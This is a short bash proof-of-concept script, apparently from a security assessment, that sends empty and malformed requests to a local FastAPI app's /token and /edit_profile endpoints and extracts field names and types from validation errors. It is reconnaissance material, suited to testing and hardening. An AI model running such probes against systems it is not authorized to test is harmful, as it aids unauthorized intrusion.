#!/bin/bash

# POC: Field Name Enumeration via Validation Error Messages
# This script demonstrates how sensitive field names can be discovered
# through FastAPI validation error responses

echo "=== Field Name Enumeration via Validation Error Messages ==="
echo ""

# Test 1: Enumerate fields in /token endpoint
echo "[+] Test 1: Enumerate fields in /token endpoint by sending empty body"
echo "Command: curl -X POST http://localhost:8080/token -H 'Content-Type: application/json' -d '{}'"
echo ""

RESPONSE=$(curl -s -X POST http://localhost:8080/token \
  -H 'Content-Type: application/json' \
  -d '{}')

echo "Response:"
echo "$RESPONSE" | jq '.' 2>/dev/null || echo "$RESPONSE"
echo ""

# Extract field names from validation errors
echo "[+] Extracted field names from error response:"
echo "$RESPONSE" | jq -r '.detail[] | "\(.loc[0]): \(.loc[1])"' 2>/dev/null | sort | uniq
echo ""

# Test 2: Try partial submission to see which fields are required
echo "[+] Test 2: Submit only password field to reveal other required fields"
echo "Command: curl -X POST http://localhost:8080/token -H 'Content-Type: application/x-www-form-urlencoded' -d 'password=test'"
echo ""

RESPONSE=$(curl -s -X POST http://localhost:8080/token \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'password=test')

echo "Response:"
echo "$RESPONSE" | jq '.' 2>/dev/null || echo "$RESPONSE"
echo ""

echo "[+] Extracted field information:"
echo "$RESPONSE" | jq -r '.detail[] | "Field: \(.loc[1]) | Type: \(.type) | Message: \(.msg)"' 2>/dev/null
echo ""

# Test 3: Enumerate fields in /edit_profile endpoint
echo "[+] Test 3: Enumerate fields in /edit_profile/{company_id} endpoint"
echo "Command: curl -X POST http://localhost:8080/edit_profile/1 -H 'Content-Type: application/json' -d '{}'"
echo ""

RESPONSE=$(curl -s -X POST http://localhost:8080/edit_profile/1 \
  -H 'Content-Type: application/json' \
  -d '{}')

echo "Response:"
echo "$RESPONSE" | jq '.' 2>/dev/null || echo "$RESPONSE"
echo ""

# Test 4: Try with invalid types to discover type information
echo "[+] Test 4: Submit invalid type data to reveal field type expectations"
echo "Command: curl -X POST http://localhost:8080/edit_profile/invalid -H 'Content-Type: application/json' -d '{}'"
echo ""

RESPONSE=$(curl -s -X POST http://localhost:8080/edit_profile/invalid \
  -H 'Content-Type: application/json' \
  -d '{}')

echo "Response:"
echo "$RESPONSE" | jq '.' 2>/dev/null || echo "$RESPONSE"
echo ""

echo "[+] Summary: Field enumeration complete"
echo "Discovered field names and types through validation error messages"